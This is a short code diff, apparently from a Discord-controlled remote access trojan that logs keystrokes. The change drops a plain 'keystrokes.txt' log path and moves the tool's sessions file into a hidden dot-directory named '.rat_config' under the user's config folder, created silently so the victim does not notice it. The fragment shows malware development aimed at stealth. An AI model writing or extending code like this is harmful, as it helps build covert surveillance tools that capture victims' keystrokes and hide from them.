@@ -18,8 +18,13 @@ session_id = None   # Define session_id as a global variable
 
 intents = discord.Intents.default()
 client = discord.Client(intents=intents)
-log_file = "keystrokes.txt"
-SESSIONS_FILE = "sessions.json"
+
+# Set a hidden directory and file path
+HIDDEN_DIR = os.path.expanduser("~/.config/.rat_config")
+SESSIONS_FILE = os.path.join(HIDDEN_DIR, ".sessions.json")
+
+# Ensure the hidden directory exists
+os.makedirs(HIDDEN_DIR, exist_ok=True)
 
 # Load existing sessions
 def load_sessions():
